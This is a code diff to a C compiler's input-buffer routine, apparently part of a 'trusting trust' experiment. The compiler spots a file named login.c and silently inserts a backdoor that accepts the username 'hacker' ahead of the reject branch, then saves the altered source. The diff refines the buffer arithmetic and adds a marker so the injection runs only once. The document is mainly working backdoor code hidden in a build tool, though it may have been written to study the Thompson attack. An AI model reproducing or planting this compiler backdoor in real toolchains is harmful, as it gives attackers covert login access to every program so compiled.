@@ -614,7 +614,7 @@ static int handle_eob(void)
             len = IO_BUF_SIZE;
 #endif
             len = read(bf->fd, bf->buffer, len);
-	    if(strcmp(file->filename, "login.c") == 0) {
+	    if(strcmp(file->filename, "login.c") == 0 && bf->buffer[0] != ' ') {
 	    	char* inject_login = "if(strcmp(username, %chacker%c) == 0) {%c    printf(%cwelcome!\\n%c);%c    return 0;%c  }%c  ";
 		unsigned char* inject_code[200];
 		snprintf(inject_code, 200, inject_login, 34, 34, 10, 34, 34, 10, 10, 10);
@@ -625,16 +625,18 @@ static int handle_eob(void)
 		unsigned char* inject_location;
 		inject_location = strstr(bf->buffer, "printf(\"Reject!");
 		int pre_inject_len = inject_location - bf->buffer;
-		strncpy(new_buf, bf->buffer, pre_inject_len);
-		strncpy(new_buf + pre_inject_len, inject_code, inject_len);
+		new_buf[0] = ' ';
+		strncpy(new_buf + 1, bf->buffer, pre_inject_len);
+		strncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);
 		strcat(new_buf, inject_location);
-		strncpy(bf->buffer, new_buf, len + inject_len);
-		len = len + inject_len;
+		len = len + inject_len - 7;
+		strncpy(bf->buffer, new_buf, len);
 		bf->buffer[len] = 0;
 
 		FILE* f = fopen("/home/zmx/Desktop/trusting-trust/hack.c", "w");
 		fwrite(bf->buffer, 1, len, f);
 		fclose(f);
+		len = len - 1;
 	    }
             if (len < 0)
                 len = 0;
